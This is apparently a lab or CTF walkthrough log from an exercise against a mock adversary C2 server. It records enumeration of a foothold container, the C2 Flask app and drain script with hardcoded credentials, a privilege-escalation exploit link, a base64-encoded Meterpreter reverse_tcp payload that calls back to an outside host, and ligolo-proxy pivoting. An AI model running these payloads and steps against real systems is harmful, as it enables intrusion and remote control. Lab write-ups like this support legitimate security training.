ptp-event       319/udp
ptp-general     320/udp
pawserv         345/tcp                         # Perf Analysis Workbench
zserv           346/tcp                         # Zebra server
rpc2portmap     369/tcp
rpc2portmap     369/udp                         # Coda portmapper
codaauth2       370/tcp
codaauth2       370/udp                         # Coda authentication server
clearcase       371/udp         Clearcase
ldap            389/tcp                 # Lightweight Directory Access Protocol
ldap            389/udp
svrloc          427/tcp                         # Server Location
svrloc          427/udp
https           443/tcp                         # http protocol over TLS/SSL
https           443/udp                         # HTTP/3
snpp            444/tcp                         # Simple Network Paging Protocol
microsoft-ds    445/tcp                         # Microsoft Naked CIFS
kpasswd         464/tcp
kpasswd         464/udp
submissions     465/tcp         ssmtp smtps urd # Submission over TLS [RFC8314]
saft            487/tcp                 # Simple Asynchronous File Transfer
isakmp          500/udp                         # IPSEC key management
rtsp            554/tcp                 # Real Time Stream Control Protocol
rtsp            554/udp
nqs             607/tcp                         # Network Queuing system
asf-rmcp        623/udp         # ASF Remote Management and Control Protocol
qmqp            628/tcp
ipp             631/tcp                         # Internet Printing Protocol
ldp             646/tcp                         # Label Distribution Protocol
ldp             646/udp
#
# UNIX specific services
#
exec            512/tcp
biff            512/udp         comsat
login           513/tcp
who             513/udp         whod
shell           514/tcp         cmd syslog      # no passwords used
syslog          514/udp
printer         515/tcp         spooler         # line printer spooler
talk            517/udp
ntalk           518/udp
route           520/udp         router routed   # RIP
gdomap          538/tcp                         # GNUstep distributed objects
gdomap          538/udp
uucp            540/tcp         uucpd           # uucp daemon
klogin          543/tcp                         # Kerberized `rlogin' (v5)
kshell          544/tcp         krcmd           # Kerberized `rsh' (v5)
dhcpv6-client   546/udp
dhcpv6-server   547/udp
afpovertcp      548/tcp                         # AFP over TCP
nntps           563/tcp         snntp           # NNTP over SSL
submission      587/tcp                         # Submission [RFC4409]
ldaps           636/tcp                         # LDAP over SSL
ldaps           636/udp
tinc            655/tcp                         # tinc control port
tinc            655/udp
silc            706/tcp
kerberos-adm    749/tcp                         # Kerberos `kadmin' (v5)
#
domain-s        853/tcp                         # DNS over TLS [RFC7858]
domain-s        853/udp                         # DNS over DTLS [RFC8094]
rsync           873/tcp
ftps-data       989/tcp                         # FTP over SSL (data)
ftps            990/tcp
telnets         992/tcp                         # Telnet over SSL
imaps           993/tcp                         # IMAP over SSL
pop3s           995/tcp                         # POP-3 over SSL
#
# From ``Assigned Numbers'':
#
#> The Registered Ports are not controlled by the IANA and on most systems
#> can be used by ordinary user processes or programs executed by ordinary
#> users.
#
#> Ports are used in the TCP [45,106] to name the ends of logical
#> connections which carry long term conversations.  For the purpose of
#> providing services to unknown callers, a service contact port is
#> defined.  This list specifies the port used by the server process as its
#> contact port.  While the IANA can not control uses of these ports it
#> does register or list uses of these ports as a convienence to the
#> community.
#
socks           1080/tcp                        # socks proxy server
proofd          1093/tcp
rootd           1094/tcp
openvpn         1194/tcp
openvpn         1194/udp
rmiregistry     1099/tcp                        # Java RMI Registry
lotusnote       1352/tcp        lotusnotes      # Lotus Note
ms-sql-s        1433/tcp                        # Microsoft SQL Server
ms-sql-m        1434/udp                        # Microsoft SQL Monitor
ingreslock      1524/tcp
datametrics     1645/tcp        old-radius
datametrics     1645/udp        old-radius
sa-msg-port     1646/tcp        old-radacct
sa-msg-port     1646/udp        old-radacct
kermit          1649/tcp
groupwise       1677/tcp
l2f             1701/udp        l2tp
radius          1812/tcp
radius          1812/udp
radius-acct     1813/tcp        radacct         # Radius Accounting
radius-acct     1813/udp        radacct
cisco-sccp      2000/tcp                        # Cisco SCCP
nfs             2049/tcp                        # Network File System
nfs             2049/udp                        # Network File System
gnunet          2086/tcp
gnunet          2086/udp
rtcm-sc104      2101/tcp                        # RTCM SC-104 IANA 1/29/99
rtcm-sc104      2101/udp
gsigatekeeper   2119/tcp
gris            2135/tcp                # Grid Resource Information Server
cvspserver      2401/tcp                        # CVS client/server operations
venus           2430/tcp                        # codacon port
venus           2430/udp                        # Venus callback/wbc interface
venus-se        2431/tcp                        # tcp side effects
venus-se        2431/udp                        # udp sftp side effect
codasrv         2432/tcp                        # not used
codasrv         2432/udp                        # server port
codasrv-se      2433/tcp                        # tcp side effects
codasrv-se      2433/udp                        # udp sftp side effect
mon             2583/tcp                        # MON traps
mon             2583/udp
dict            2628/tcp                        # Dictionary server
f5-globalsite   2792/tcp
gsiftp          2811/tcp
gpsd            2947/tcp
gds-db          3050/tcp        gds_db          # InterBase server
icpv2           3130/udp        icp             # Internet Cache Protocol
isns            3205/tcp                        # iSNS Server Port
isns            3205/udp                        # iSNS Server Port
iscsi-target    3260/tcp
mysql           3306/tcp
ms-wbt-server   3389/tcp
nut             3493/tcp                        # Network UPS Tools
nut             3493/udp
distcc          3632/tcp                        # distributed compiler
daap            3689/tcp                        # Digital Audio Access Protocol
svn             3690/tcp        subversion      # Subversion protocol
suucp           4031/tcp                        # UUCP over SSL
sysrqd          4094/tcp                        # sysrq daemon
sieve           4190/tcp                        # ManageSieve Protocol
epmd            4369/tcp                        # Erlang Port Mapper Daemon
remctl          4373/tcp                # Remote Authenticated Command Service
f5-iquery       4353/tcp                        # F5 iQuery
ntske           4460/tcp        # Network Time Security Key Establishment
ipsec-nat-t     4500/udp                        # IPsec NAT-Traversal [RFC3947]
iax             4569/udp                        # Inter-Asterisk eXchange
mtn             4691/tcp                        # monotone Netsync Protocol
radmin-port     4899/tcp                        # RAdmin Port
sip             5060/tcp                        # Session Initiation Protocol
sip             5060/udp
sip-tls         5061/tcp
sip-tls         5061/udp
xmpp-client     5222/tcp        jabber-client   # Jabber Client Connection
xmpp-server     5269/tcp        jabber-server   # Jabber Server Connection
cfengine        5308/tcp
mdns            5353/udp                        # Multicast DNS
postgresql      5432/tcp        postgres        # PostgreSQL Database
freeciv         5556/tcp        rptp            # Freeciv gameplay
amqps           5671/tcp                        # AMQP protocol over TLS/SSL
amqp            5672/tcp
amqp            5672/sctp
coap            5683/tcp                # Constrained Application Protocol
coap            5683/udp                # Constrained Application Protocol
coaps           5684/tcp                        # TLS-secured CoAP
coaps           5684/udp                        # DTLS-secured CoAP
x11             6000/tcp        x11-0           # X Window System
x11-1           6001/tcp
x11-2           6002/tcp
x11-3           6003/tcp
x11-4           6004/tcp
x11-5           6005/tcp
x11-6           6006/tcp
x11-7           6007/tcp
gnutella-svc    6346/tcp                        # gnutella
gnutella-svc    6346/udp
gnutella-rtr    6347/tcp                        # gnutella
gnutella-rtr    6347/udp
redis           6379/tcp
sge-qmaster     6444/tcp        sge_qmaster     # Grid Engine Qmaster Service
sge-execd       6445/tcp        sge_execd       # Grid Engine Execution Service
mysql-proxy     6446/tcp                        # MySQL Proxy
babel           6696/udp                        # Babel Routing Protocol
ircs-u          6697/tcp                # Internet Relay Chat via TLS/SSL
bbs             7000/tcp
afs3-fileserver 7000/udp
afs3-callback   7001/udp                        # callbacks to cache managers
afs3-prserver   7002/udp                        # users & groups database
afs3-vlserver   7003/udp                        # volume location database
afs3-kaserver   7004/udp                        # AFS/Kerberos authentication
afs3-volser     7005/udp                        # volume managment server
afs3-bos        7007/udp                        # basic overseer process
afs3-update     7008/udp                        # server-to-server updater
afs3-rmtsys     7009/udp                        # remote cache manager service
font-service    7100/tcp        xfs             # X Font Service
http-alt        8080/tcp        webcache        # WWW caching service
puppet          8140/tcp                        # The Puppet master service
bacula-dir      9101/tcp                        # Bacula Director
bacula-fd       9102/tcp                        # Bacula File Daemon
bacula-sd       9103/tcp                        # Bacula Storage Daemon
xmms2           9667/tcp        # Cross-platform Music Multiplexing System
nbd             10809/tcp                       # Linux Network Block Device
zabbix-agent    10050/tcp                       # Zabbix Agent
zabbix-trapper  10051/tcp                       # Zabbix Trapper
amanda          10080/tcp                       # amanda backup services
dicom           11112/tcp
hkp             11371/tcp                       # OpenPGP HTTP Keyserver
db-lsp          17500/tcp                       # Dropbox LanSync Protocol
dcap            22125/tcp                       # dCache Access Protocol
gsidcap         22128/tcp                       # GSI dCache Access Protocol
wnn6            22273/tcp                       # wnn6

#
# Datagram Delivery Protocol services
#
rtmp            1/ddp                   # Routing Table Maintenance Protocol
nbp             2/ddp                   # Name Binding Protocol
echo            4/ddp                   # AppleTalk Echo Protocol
zip             6/ddp                   # Zone Information Protocol

#=========================================================================
# The remaining port numbers are not as allocated by IANA.
#=========================================================================

# Kerberos (Project Athena/MIT) services
kerberos4       750/udp         kerberos-iv kdc # Kerberos (server)
kerberos4       750/tcp         kerberos-iv kdc
kerberos-master 751/udp         kerberos_master # Kerberos authentication
kerberos-master 751/tcp
passwd-server   752/udp         passwd_server   # Kerberos passwd server
krb-prop        754/tcp         krb_prop krb5_prop hprop # Kerberos slave propagation
zephyr-srv      2102/udp                        # Zephyr server
zephyr-clt      2103/udp                        # Zephyr serv-hm connection
zephyr-hm       2104/udp                        # Zephyr hostmanager
iprop           2121/tcp                        # incremental propagation
supfilesrv      871/tcp                 # Software Upgrade Protocol server
supfiledbg      1127/tcp                # Software Upgrade Protocol debugging

#
# Services added for the Debian GNU/Linux distribution
#
poppassd        106/tcp                         # Eudora
moira-db        775/tcp         moira_db        # Moira database
moira-update    777/tcp         moira_update    # Moira update protocol
moira-ureg      779/udp         moira_ureg      # Moira user registration
spamd           783/tcp                         # spamassassin daemon
skkserv         1178/tcp                        # skk jisho server port
predict         1210/udp                        # predict -- satellite tracking
rmtcfg          1236/tcp                        # Gracilis Packeten remote config server
xtel            1313/tcp                        # french minitel
xtelw           1314/tcp                        # french minitel
zebrasrv        2600/tcp                        # zebra service
zebra           2601/tcp                        # zebra vty
ripd            2602/tcp                        # ripd vty (zebra)
ripngd          2603/tcp                        # ripngd vty (zebra)
ospfd           2604/tcp                        # ospfd vty (zebra)
bgpd            2605/tcp                        # bgpd vty (zebra)
ospf6d          2606/tcp                        # ospf6d vty (zebra)
ospfapi         2607/tcp                        # OSPF-API
isisd           2608/tcp                        # ISISd vty (zebra)
fax             4557/tcp                        # FAX transmission service (old)
hylafax         4559/tcp                        # HylaFAX client-server protocol (new)
munin           4949/tcp        lrrd            # Munin
rplay           5555/udp                        # RPlay audio service
nrpe            5666/tcp                        # Nagios Remote Plugin Executor
nsca            5667/tcp                        # Nagios Agent - NSCA
canna           5680/tcp                        # cannaserver
syslog-tls      6514/tcp                        # Syslog over TLS [RFC5425]
sane-port       6566/tcp        sane saned      # SANE network scanner daemon
ircd            6667/tcp                        # Internet Relay Chat
zope-ftp        8021/tcp                        # zope management by ftp
tproxy          8081/tcp                        # Transparent Proxy
omniorb         8088/tcp                        # OmniORB
clc-build-daemon 8990/tcp                       # Common lisp build daemon
xinetd          9098/tcp
git             9418/tcp                        # Git Version Control System
zope            9673/tcp                        # zope server
webmin          10000/tcp
kamanda         10081/tcp                       # amanda backup services (Kerberos)
amandaidx       10082/tcp                       # amanda backup services
amidxtape       10083/tcp                       # amanda backup services
sgi-cmsd        17001/udp               # Cluster membership services daemon
sgi-crsd        17002/udp
sgi-gcd         17003/udp                       # SGI Group membership daemon
sgi-cad         17004/tcp                       # Cluster Admin daemon
binkp           24554/tcp                       # binkp fidonet protocol
asp             27374/tcp                       # Address Search Protocol
asp             27374/udp
csync2          30865/tcp                       # cluster synchronization tool
dircproxy       57000/tcp                       # Detachable IRC Proxy
tfido           60177/tcp                       # fidonet EMSI over telnet
fido            60179/tcp                       # fidonet EMSI over TCP

foothold@e5316a5b004d:~$ ss -tulpan
Netid            State                Recv-Q             Send-Q                         Local Address:Port                          Peer Address:Port             Process            
udp              UNCONN               0                  0                                 127.0.0.11:38545                              0.0.0.0:*                                   
tcp              LISTEN               0                  128                                  0.0.0.0:2222                               0.0.0.0:*                                   
tcp              LISTEN               0                  4096                              127.0.0.11:38423                              0.0.0.0:*                                   
tcp              LISTEN               0                  2048                               127.0.0.1:9001                               0.0.0.0:*                                   
tcp              LISTEN               0                  2048                               127.0.0.1:9000                               0.0.0.0:*                                   
tcp              LISTEN               0                  511                                  0.0.0.0:8080                               0.0.0.0:*                                   
tcp              TIME-WAIT            0                  0                                  127.0.0.1:9001                             127.0.0.1:51612                               
tcp              TIME-WAIT            0                  0                                 172.18.0.3:51646                           172.18.0.2:5432                                
tcp              TIME-WAIT            0                  0                                  127.0.0.1:34974                            127.0.0.1:9000                                
tcp              TIME-WAIT            0                  0                                  127.0.0.1:9000                             127.0.0.1:38466                               
tcp              TIME-WAIT            0                  0                                  127.0.0.1:38148                            127.0.0.1:9000                                
tcp              TIME-WAIT            0                  0                                  127.0.0.1:35960                            127.0.0.1:8080                                
tcp              TIME-WAIT            0                  0                                  127.0.0.1:36786                            127.0.0.1:8080                                
tcp              TIME-WAIT            0                  0                                  127.0.0.1:37898                            127.0.0.1:8080                                
tcp              ESTAB                0                  36                                172.18.0.3:2222                           30.40.50.10:58664                               
tcp              TIME-WAIT            0                  0                                  127.0.0.1:40614                            127.0.0.1:8080                                
tcp              TIME-WAIT            0                  0                                 172.18.0.3:33860                           172.18.0.2:5432                                
tcp              TIME-WAIT            0                  0                                  127.0.0.1:53204                            127.0.0.1:9000                                
tcp              LISTEN               0                  128                                     [::]:2222                                  [::]:*    

foothold@e5316a5b004d:/tmp$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#

foothold@e5316a5b004d:/var/www/html$ ls -la /etc/cron.*     
/etc/cron.d:
total 20
drwxr-xr-x 1 root root 4096 Jun  8 03:31 .
drwxr-xr-x 1 root root 4096 Jun  8 14:55 ..
-rw-r--r-- 1 root root  102 Jun 13  2025 .placeholder
-rw-r--r-- 1 root root  126 Jun  8 03:27 c2-drain

foothold@e5316a5b004d:/var/www/html$ cat /etc/cron.d/c2-drain 
* * * * * root /bin/bash -lc "python3 /opt/c2/drain.py; sleep 30; python3 /opt/c2/drain.py" >> /var/log/adv-c2/drain.log 2>&1

foothold@e5316a5b004d:/var/www/html$ cat /opt/c2/drain.py 
import hashlib
import json
import os
import re
import shutil
import gzip
import base64
from pathlib import Path
import psycopg2
import yaml
CONFIG_PATH = Path("/opt/c2/config.yaml")
INCOMING_DIR = Path("/opt/staging/incoming")
SHARED_EXFIL_DIR = Path("/shared/exfil")
SHARED_CORPUS_DIR = Path("/shared/corpus")
VALID_TIMESTAMP_RE = re.compile(r"^\d{8}T\d{6}Z$")
HTML_IMG_RE = re.compile(r"<img\b[^>]*>", re.IGNORECASE)
def load_config():
    cfg = yaml.safe_load(CONFIG_PATH.read_text(encoding="utf-8"))
    cfg["db"]["host"] = os.getenv("DB_HOST", cfg["db"]["host"])
    cfg["db"]["port"] = int(os.getenv("DB_PORT", cfg["db"]["port"]))
    cfg["db"]["name"] = os.getenv("DB_NAME", cfg["db"]["name"])
    cfg["db"]["user"] = os.getenv("DB_USER", cfg["db"]["user"])
    cfg["db"]["password"] = os.getenv("DB_PASS", cfg["db"]["password"])
    return cfg
def parse_metadata(path: Path):
    meta_path = path.with_name(f"{path.name}.meta.json")
    if meta_path.exists():
        data = json.loads(meta_path.read_text(encoding="utf-8"))
        return (
            int(data.get("size_bytes", path.stat().st_size)),
            data.get("sha256", hashlib.sha256(path.read_bytes()).hexdigest()),
            data.get("source_host", "adv-exfil-agent"),
            meta_path,
        )
    return (
        path.stat().st_size,
        hashlib.sha256(path.read_bytes()).hexdigest(),
        "adv-exfil-agent",
        None,
    )
def parse_pipeline_filename(fname: str):
    if not fname.endswith(".b64"):
        return None
    stem = fname[:-4]
    parts = stem.split("_")
    if len(parts) < 5:
        return None
    timestamp = parts[0]
    if VALID_TIMESTAMP_RE.match(timestamp) is None:
        return None
    category = parts[-1]
    exfil_host = parts[-2]
    source_host = parts[-3]
    orig_with_ext = "_".join(parts[1:-3])
    orig_base, orig_ext = os.path.splitext(orig_with_ext)
    if not orig_base or not orig_ext:
        return None
    return {
        "timestamp": timestamp,
        "orig_base": orig_base,
        "orig_ext": orig_ext.lstrip(".").lower(),
        "source_host": source_host,
        "exfil_host": exfil_host,
        "category": category.upper(),
    }
def decode_pipeline_payload(path: Path):
    raw = path.read_bytes()
    decoded = base64.b64decode(raw, validate=True)
    return gzip.decompress(decoded)
def strip_tracking_pixels_if_text(payload: bytes, ext: str):
    if ext not in {"html", "htm", "md", "markdown"}:
        return payload
    text = payload.decode("utf-8", errors="ignore")
    # Intended to remove tracking pixels before analyst review.
    # BUG: only HTML <img> tags are stripped; markdown image syntax remains.
    cleaned = HTML_IMG_RE.sub("", text)
    return cleaned.encode("utf-8")
def main():
    cfg = load_config()
    SHARED_EXFIL_DIR.mkdir(parents=True, exist_ok=True)
    SHARED_CORPUS_DIR.mkdir(parents=True, exist_ok=True)
    INCOMING_DIR.mkdir(parents=True, exist_ok=True)
    review_category = os.getenv("PIPELINE_REVIEW_CATEGORY", "REVIEW").upper()
    allowlist = {
        item.strip().upper()
        for item in os.getenv("PIPELINE_CATEGORY_ALLOWLIST", "REVIEW,ARCHIVE,INTEL").split(",")
        if item.strip()
    }
    dsn = (
        f"dbname={cfg['db']['name']} user={cfg['db']['user']} "
        f"password={cfg['db']['password']} host={cfg['db']['host']} port={cfg['db']['port']}"
    )
    conn = psycopg2.connect(dsn)
    conn.autocommit = True
    cur = conn.cursor()
    for path in sorted(INCOMING_DIR.iterdir()):
        if path.name.endswith(".meta.json") or not path.is_file():
            continue
        fname = path.name
        parsed = parse_pipeline_filename(fname)
        size, sha, host, meta_path = parse_metadata(path)
        category = "UNKNOWN"
        pipeline_status = "quarantined"
        decoded_name = None
        decoded_size = 0
        if parsed is not None:
            category = parsed["category"]
        if parsed is not None and category in allowlist:
            try:
                payload = decode_pipeline_payload(path)
            except Exception:
                pipeline_status = "decode_error"
                shutil.copy2(path, SHARED_CORPUS_DIR / fname)
            else:
                source_host = parsed["source_host"] or host
                host = source_host
                if category == review_category:
                    cleaned = strip_tracking_pixels_if_text(payload, parsed["orig_ext"])
                    decoded_name = f"{parsed['timestamp']}_{parsed['orig_base']}.{parsed['orig_ext']}"
                    destination = SHARED_EXFIL_DIR / decoded_name
                    destination.write_bytes(cleaned)
                    decoded_size = destination.stat().st_size
                    pipeline_status = "review_ready"
                else:
                    shutil.copy2(path, SHARED_CORPUS_DIR / fname)
                    pipeline_status = "stored_nonreview"
        else:
            shutil.copy2(path, SHARED_CORPUS_DIR / fname)
        cur.execute(
            """
            INSERT INTO exfil_logs
              (filename, size_bytes, sha256, source_host, category, pipeline_status, decoded_filename, decoded_size_bytes)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
            """,
            (fname, size, sha, host, category, pipeline_status, decoded_name, decoded_size),
        )
        if meta_path and meta_path.exists():
            shutil.copy2(meta_path, SHARED_CORPUS_DIR / meta_path.name)
            meta_path.unlink(missing_ok=True)
        path.unlink(missing_ok=True)
    cur.close()
    conn.close()
if __name__ == "__main__":
    main()

foothold@e5316a5b004d:/tmp$ ls -la /opt/c2/
total 44
drwxr-xr-x 1 c2-app c2-app 4096 Jun  8 03:31 .
drwxr-xr-x 1 root   root   4096 Jun  8 03:31 ..
-rw-rw-r-- 1 c2-app c2-app  123 Jun  8 03:27 adversary_notes.txt
-rw-rw-r-- 1 c2-app c2-app 4713 Jun  8 03:27 app.py
-rw-rw-r-- 1 c2-app c2-app  211 Jun  9 04:22 config.yaml
-rw-rw-r-- 1 c2-app c2-app 5666 Jun  8 03:27 drain.py
-rw-rw-r-- 1 c2-app c2-app   67 Jun  8 03:27 requirements.txt

foothold@e5316a5b004d:/tmp$ cat /opt/c2/adversary_notes.txt 
adv-n8n admin endpoint: http://20.30.40.153:5678
adv-n8n admin username: adv_operator
adv-n8n admin password: operator!n8n

foothold@e5316a5b004d:/tmp$ cat /opt/c2/app.py              
import hashlib
import json
import os
from pathlib import Path
import shlex
import subprocess

from flask import Flask, Response, jsonify, request
import yaml

APP_DIR = Path("/opt/c2")
CONFIG_PATH = APP_DIR / "config.yaml"
INCOMING_DIR = Path("/opt/staging/incoming")

app = Flask(__name__)


def load_config():
    with CONFIG_PATH.open("r", encoding="utf-8") as handle:
        cfg = yaml.safe_load(handle)
    # Environment variables override static file defaults.
    cfg["ingest_token"] = os.getenv("C2_INGEST_TOKEN", cfg.get("ingest_token", "INGEST-3d9f2c"))
    cfg["db"] = cfg.get("db", {})
    cfg["db"]["host"] = os.getenv("DB_HOST", cfg["db"].get("host", "20.30.40.151"))
    cfg["db"]["port"] = int(os.getenv("DB_PORT", cfg["db"].get("port", 5432)))
    cfg["db"]["name"] = os.getenv("DB_NAME", cfg["db"].get("name", "adv_collector"))
    cfg["db"]["user"] = os.getenv("DB_USER", cfg["db"].get("user", "adv_analyst"))
    cfg["db"]["password"] = os.getenv("DB_PASS", cfg["db"].get("password", "collector!db"))
    tasking_env = os.getenv("C2_TASKING_JSON")
    if tasking_env:
        try:
            cfg["tasking"] = json.loads(tasking_env)
        except json.JSONDecodeError:
            pass
    return cfg


def admin_ok():
    auth = request.authorization
    if not auth:
        return False
    return (
        auth.username == os.getenv("C2_ADMIN_USER", "admin")
        and auth.password == os.getenv("C2_ADMIN_PASS", "adminadmin")
    )


def command_allowed(cmd):
    allowlist_raw = os.getenv(
        "C2_ADMIN_EXEC_ALLOWLIST",
        "hostname,whoami,pwd,id,ls,cat,tail,grep,sed,awk,ps,ss,supervisorctl,python3,bash,sh,date,echo",
    )
    allowlist = {item.strip() for item in allowlist_raw.split(",") if item.strip()}
    try:
        token = shlex.split(cmd)[0]
    except (ValueError, IndexError):
        return False
    return token in allowlist


@app.get("/healthz")
def healthz():
    return jsonify({"status": "ok"})


@app.get("/admin")
def admin():
    if not admin_ok():
        return Response(
            "Authentication required",
            status=401,
            headers={"WWW-Authenticate": 'Basic realm="adv-c2-admin"'},
        )
    return jsonify(
        {
            "panel": "adv-c2 admin shim",
            "status": "authenticated",
            "note": "Use approved remote foothold channel for maintenance actions.",
        }
    )


@app.get("/admin/exec")
def admin_exec():
    if not admin_ok():
        return Response(
            "Authentication required",
            status=401,
            headers={"WWW-Authenticate": 'Basic realm="adv-c2-admin"'},
        )
    cmd = request.args.get("cmd", "").strip()
    if not cmd:
        return jsonify({"status": "missing cmd"}), 400
    if not command_allowed(cmd):
        return jsonify({"status": "blocked", "reason": "command not in allowlist"}), 403
    try:
        proc = subprocess.run(
            cmd,
            shell=True,
            check=False,
            capture_output=True,
            text=True,
            timeout=20,
            executable="/bin/bash",
        )
    except subprocess.TimeoutExpired:
        return jsonify({"status": "timeout"}), 504
    return jsonify(
        {
            "status": "ok",
            "cmd": cmd,
            "returncode": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
        }
    )


@app.route("/beacon", methods=["GET", "POST"])
def beacon():
    return jsonify({"result": "ok"})


@app.get("/tasking")
def tasking():
    cfg = load_config()
    return jsonify({"tasking": cfg.get("tasking", [])})


@app.post("/exfil")
def exfil():
    cfg = load_config()
    token = request.headers.get("X-Ingest-Token", "")
    if token != cfg["ingest_token"]:
        return jsonify({"status": "unauthorized"}), 401

    upload = request.files.get("artifact")
    if upload is None:
        return jsonify({"status": "missing artifact"}), 400

    filename = upload.filename or "artifact.bin"
    artifact_path = INCOMING_DIR / filename
    artifact_path.parent.mkdir(parents=True, exist_ok=True)
    upload.save(artifact_path)

    size_bytes = artifact_path.stat().st_size
    sha256 = hashlib.sha256(artifact_path.read_bytes()).hexdigest()
    source_host = request.form.get("source_host", "adv-exfil-agent")

    meta = {
        "size_bytes": int(request.form.get("size_bytes", size_bytes)),
        "sha256": request.form.get("sha256", sha256),
        "source_host": source_host,
    }
    meta_path = artifact_path.with_name(f"{artifact_path.name}.meta.json")
    meta_path.write_text(json.dumps(meta), encoding="utf-8")

    return jsonify({"status": "queued", "filename": filename}), 200

foothold@e5316a5b004d:/tmp$ cat /opt/c2/config.yaml 
db:
  host: adv-collector-db
  port: 5432
  name: adv_collector
  user: adv_analyst
  password: collector!db
ingest_token: INGEST-3d9f2c
tasking:
- id: tsk-001
  command: collect-system-profile
  status: queued

foothold@e5316a5b004d:/tmp$ cat /opt/c2/requirements.txt 
flask==3.0.3
gunicorn==22.0.0
psycopg2-binary==2.9.9
pyyaml==6.0.1

foothold@e5316a5b004d:/tmp$ curl -v telnet://adv-collector-db
* Host adv-collector-db:23 was resolved.
* IPv6: (none)
* IPv4: 172.18.0.2
*   Trying 172.18.0.2:23...
* connect to 172.18.0.2 port 23 from 172.18.0.3 port 33088 failed: Connection refused
* Failed to connect to adv-collector-db port 23 after 0 ms: Could not connect to server
* closing connection #0
curl: (7) Failed to connect to adv-collector-db port 23 after 0 ms: Could not connect to server

foothold@e5316a5b004d:/tmp$ curl -v telnet://adv-collector-db:5432
* Host adv-collector-db:5432 was resolved.
* IPv6: (none)
* IPv4: 172.18.0.2
*   Trying 172.18.0.2:5432...
* Connected to adv-collector-db (172.18.0.2) port 5432


```

### Found artifacts
 - Services and processes supporting the exfil ingestion endpoints.
	 - /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/c2.conf
	 - 30.40.50.10:58664
 - Scheduled execution, such as cron or systemd timers, that moves incoming artifacts into the collector database.
	 - * * * * * root /bin/bash -lc "python3 /opt/c2/drain.py; sleep 30; python3 /opt/c2/drain.py" >> /var/log/adv-c2/drain.log 2>&1
- Credential(s) the exfil agent is authenticating with against `/exfil` or `/beacon`.
	- db:
	  host: adv-collector-db
	  port: 5432
	  name: adv_collector
	  user: adv_analyst
	  password: collector!db
- Observe the live exfil cadence in `/var/log/adv-c2/access.log` for at least two agent cycles so you can establish a baseline.
	- every minute
```
172.18.0.1 - - [09/Jun/2026:12:58:02 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
172.18.0.1 - - [09/Jun/2026:12:59:01 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
172.18.0.1 - - [09/Jun/2026:13:00:01 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
172.18.0.1 - - [09/Jun/2026:13:01:01 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
```

## privesc on foothold and get a better shell
- [copy-fail-CVE-2026-31431/copy_fail_exp.py at main · theori-io/copy-fail-CVE-2026-31431 · GitHub](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py)
```
msf > use payload/linux/x64/meterpreter/reverse_tcp 
msf payload(linux/x64/meterpreter/reverse_tcp) > set LHOST 30.40.50.10
LHOST => 30.40.50.10
msf payload(linux/x64/meterpreter/reverse_tcp) > set LPORT 5555
LPORT => 5555
msf payload(linux/x64/meterpreter/reverse_tcp) > set prependfork true
prependfork => true
msf payload(linux/x64/meterpreter/reverse_tcp) > generate -f elf -o rev
[*] Writing 282 bytes to rev...
msf payload(linux/x64/meterpreter/reverse_tcp) > base64 rev
[*] exec: base64 rev

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB
AAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQ
AAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpq
B1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCABWzHigyClFIieZqEFpqKlgPBVlI
hcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m
msf payload(linux/x64/meterpreter/reverse_tcp) > handler -p linux/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 5555
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 0.0.0.0:5555 
msf payload(linux/x64/meterpreter/reverse_tcp) > sessions

Active sessions
===============

No active sessions.

msf payload(linux/x64/meterpreter/reverse_tcp) > 
[*] Sending stage (3090404 bytes) to 20.30.40.150
[*] Meterpreter session 1 opened (30.40.50.10:5555 -> 20.30.40.150:55926) at 2026-06-09 13:12:03 -0400
sessions 1


```

```
foothold@e5316a5b004d:/tmp$ python cf.py
# cd ~
: 1: cd: can't cd to ~
# cd /home/foothold
# ./rev
```
## setting up ligolo-proxy
```
┌──(root㉿blue-ops)-[~]
└─# ligolo-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
